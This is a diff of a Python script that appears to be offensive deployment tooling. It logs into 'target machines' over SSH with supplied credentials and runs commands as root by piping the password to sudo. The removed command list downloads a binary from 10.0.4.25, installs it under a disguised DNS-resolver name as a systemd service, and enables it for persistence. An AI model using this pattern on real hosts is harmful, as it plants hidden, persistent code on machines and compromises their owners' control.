@@ -12,11 +12,6 @@ from socketserver import TCPServer
 
 # The commands that will be run over SSH on the target machines in order of execution
 COMMANDS = [
-    "wget http://10.0.4.25/resolution -O /usr/bin/ldns-resolver",
-    "wget http://10.0.4.25/system-dns.service -O /usr/lib/systemd/system/system-dns.service",
-    "chmod +x /usr/bin/ldns-resolver",
-    "systemctl enable system-dns",
-    "systemctl start system-dns"
 ]
 # The IP address of the machine running this script in the network
 SERVER = "10.0.4.25"
@@ -98,7 +93,9 @@ def deploy(host, username, password):
         for command in COMMANDS:
             # Get the binary we're executing for logging purposes
             binary = command.split(" ")[0]
-            _, stdout, stderr = client.exec_command(command)
+            stdin, stdout, stderr = client.exec_command(f"sudo -k {command}", get_pty=True)
+            stdin.write(f"{password}\n")
+            stdin.flush()
             # all returns must be 0. Adding all together must == 0
             status_code += int(stdout.channel.recv_exit_status())
             # accumulate all error messages to display each to user
@@ -110,7 +107,7 @@ def deploy(host, username, password):
         return status_code, err
 
     except Exception as e:
-        return 1, f"\t{str(e)}"
+        return 1, f"\tScript Error:{str(e)}"
 
 def run():
     global failures
